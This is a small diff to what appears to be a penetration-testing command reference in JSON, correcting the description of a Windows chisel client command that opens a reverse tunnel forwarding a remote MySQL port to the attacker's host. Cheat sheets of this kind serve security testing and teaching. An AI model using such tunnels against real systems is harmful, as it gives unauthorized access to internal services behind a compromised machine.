@@ -106,7 +106,7 @@
     {
       "os": "Windows",
       "cmd": ".\\chisel.exe client -v {LHOST}: R:{LPORT}:{RHOST}:{RPORT}",
-      "description": ".\\chisel.exe client -v {LHOST}: R:3306:127.0.0.1:{"
+      "description": ".\\chisel.exe client -v {LHOST}: R:3306:127.0.0.1:3306"
     }
   ],
   "credential_and_ad_management": [
